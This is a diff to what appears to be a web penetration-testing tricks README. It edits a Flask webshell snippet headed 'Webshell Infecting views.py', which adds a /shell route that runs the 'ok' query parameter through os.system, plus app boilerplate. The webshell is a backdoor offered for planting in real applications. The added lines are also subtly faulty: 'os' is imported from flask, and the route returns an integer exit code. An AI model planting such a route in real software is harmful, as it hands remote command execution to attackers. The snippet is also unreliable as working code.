@@ -807,16 +807,24 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 https://tryhackme.com/room/sqlilab
 
-### Webshell Infecting views.py - Python(Flask)
+### Webshell Infecting views.py - Python (Flask)
 ```
 import os
 from app.utils import get_file_name
 from flask import render_template, request, send_file
 from app import app
 ...
+import os
+from flask import Flask,request,os
+
+app = Flask(__name__)
+   
 @app.route('/shell')
 def cmd():
     return os.system(request.args.get('ok'))
+
+if __name__ == "__main__":
+	app.run()
 ```
 
 ### Webshell infecting views.js -> nodejs
